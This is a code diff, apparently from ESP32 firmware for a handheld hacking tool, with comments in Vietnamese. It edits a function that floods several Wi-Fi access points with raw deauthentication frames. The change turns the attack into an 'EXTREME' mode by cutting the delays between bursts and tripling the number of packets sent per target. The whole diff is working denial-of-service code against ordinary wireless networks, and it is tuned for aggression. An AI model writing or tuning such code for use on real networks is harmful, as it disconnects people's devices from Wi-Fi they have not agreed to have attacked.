@@ -1090,7 +1090,7 @@ void beaconAttack() {
 // =========================================================================
 
 // 1. ENGINE ÐÁNH MULTI (UI TINH 100% - CH? V? 1 L?N, IN DANH SÁCH M?C TIÊU)
-// 1. ENGINE ĐÁNH MULTI - ƯU TIÊN ỔN ĐỊNH & NHẠY NÚT BẤM
+// 1. ENGINE ĐÁNH MULTI - BẢN EXTREME (TĂNG CƯỜNG HỎA LỰC)
 void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) {
         displayTextLine("No APs found!");
@@ -1100,62 +1100,51 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
         return;
     }
 
-    // --- VẼ UI TĨNH (CHỈ VẼ 1 LẦN DUY NHẤT) ---
-    drawMainBorderWithTitle("Multi-Deauth");
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    
+    // UI TĨNH (Vẫn giữ để tiết kiệm CPU)
+    drawMainBorderWithTitle("Multi-Atk EXTREME");
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor); // Chữ đỏ cho máu chiến
     tft.setCursor(10, 40);
-    tft.println("Attacking " + String(targets.size()) + " Targets:");
+    tft.println("Aggressive Mode Active!");
 
     int startY = 60;
     for (size_t i = 0; i < targets.size(); i++) {
         String ssid_str = String((char*)targets[i].ssid);
         if (ssid_str.length() == 0) ssid_str = "HIDDEN";
         if (ssid_str.length() > 16) ssid_str = ssid_str.substring(0, 16) + "..";
-        
         tft.setCursor(10, startY + (i * 18));
-        tft.println("- " + ssid_str + " (Ch" + String(targets[i].primary) + ")");
+        tft.println("> " + ssid_str + " (Ch" + String(targets[i].primary) + ")");
     }
-
-    tft.setCursor(10, tftHeight - 20);
-    tft.println("Press Back/Esc to Stop");
-    // ------------------------------------------
 
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
-    // VÒNG LẶP TẤN CÔNG CHÍNH
+    // VÒNG LẶP TẤN CÔNG "RAPID FIRE"
     while (true) {
         for (const auto &target : targets) {
-            // Chuyển kênh và chuẩn bị frame
+            // Nhảy kênh
             wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
             
-            // Nghỉ 20ms để ổn định Radio sau khi nhảy kênh (Rất quan trọng cho C5)
-            vTaskDelay(pdMS_TO_TICKS(20));
+            // ÉP XUNG: Chỉ nghỉ 5ms để Driver kịp nhận lệnh (Không được để 0ms vì sẽ treo)
+            vTaskDelay(pdMS_TO_TICKS(5));
 
-            // Bắn 10 đợt gói tin
-            for (int i = 0; i < 10; i++) {
+            // BẮN RÁT: 30 đợt liên tục (tương đương 90 gói deauth / 1 lần ghé thăm)
+            for (int i = 0; i < 30; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                 
-                // Kiểm tra nút bấm ngay lập tức trong lúc bắn
+                // Check nút bấm cực nhanh
                 if (check(EscPress)) goto EXIT_ENGINE;
             }
 
-            // Nghỉ ngắn giữa các mục tiêu (chia nhỏ để check nút bấm)
-            for (int d = 0; d < 3; d++) {
-                vTaskDelay(pdMS_TO_TICKS(5));
-                if (check(EscPress)) goto EXIT_ENGINE;
-            }
-        }
-        
-        // Nghỉ 100ms sau mỗi chu kỳ quét (chia nhỏ thành 10 lần check nút)
-        for (int d = 0; d < 10; d++) {
-            vTaskDelay(pdMS_TO_TICKS(10));
+            // Nghỉ tối thiểu 2ms để FreeRTOS không kick Watchdog
+            vTaskDelay(pdMS_TO_TICKS(2));
             if (check(EscPress)) goto EXIT_ENGINE;
         }
+        
+        // Nghỉ vòng lặp lớn chỉ 10ms (đủ để chip xử lý task nền)
+        vTaskDelay(pdMS_TO_TICKS(10));
+        if (check(EscPress)) goto EXIT_ENGINE;
     }
 
 EXIT_ENGINE:
-    // Thoát an toàn
     displayTextLine("Stopping Atk...");
     wifi_atk_unsetWifi();
     delay(500);
